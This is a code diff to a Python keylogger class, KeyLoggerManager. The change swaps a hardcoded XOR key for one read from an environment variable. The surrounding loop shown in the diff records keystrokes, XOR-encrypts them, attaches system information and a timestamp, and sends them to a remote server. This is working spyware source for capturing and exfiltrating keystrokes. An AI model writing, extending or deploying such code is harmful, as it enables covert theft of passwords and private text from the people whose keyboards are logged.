@@ -16,14 +16,13 @@ class KeyLoggerManager:
         self.key = os.getenv( 'SECRET_KEY' )
 
     def start_to_program(self):
-        key="israelvitzman"
         self.start.start_logging()
 
         while True:
            self.start.stop_logging()
            time.sleep(self.TIME)
            text =''.join(self.start.get_logged_keys())
-           xor=self.xor.xor_encrypt(text,key)
+           xor=self.xor.xor_encrypt(text,self.key)
            now=datetime.now()
            data_for_system=self.start.system_information()
            self.send_client.send_to_server({"time":now.strftime('%d/%m/%Y %H:%M:%S'),"data":xor,"system":data_for_system})
